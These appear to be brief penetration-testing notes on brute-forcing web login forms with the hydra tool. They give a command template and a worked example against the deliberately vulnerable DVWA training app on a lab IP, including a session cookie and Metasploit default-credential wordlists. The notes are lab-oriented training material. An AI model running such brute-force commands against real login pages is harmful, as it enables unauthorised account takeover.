## hydra
### http-get-form
Refs:
* <https://youtu.be/3pSjwLbdxLA>
* <https://securitytutorials.co.uk/brute-forcing-web-logins-with-dvwa/>

Typical layout of the command is as follows
```
hydra -L <USER> -P <Password> <IP Address> http-post-form “<Login Page>:<Request parameters/body>:<Error Message>”
```
Lets, take a typical case of bruteforcing the dvwa app. Here, we are already logged-in. Therefore, we have to send the cookies along with our hydra command. In order to include cookies we use header tag `H:`

```
hydra -L username1 -P password1 10.10.10.107 http-get-form '/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H:Cookie: security=low; PHPSESSID=aa324b92c3da5e8d7b63d594750ff63b'
```
We can also use following wordlists :
* `usr/share/wordlists/metasploit/http_default_users.txt`
* `usr/share/wordlists/metasploit/http_default_pass.txt`

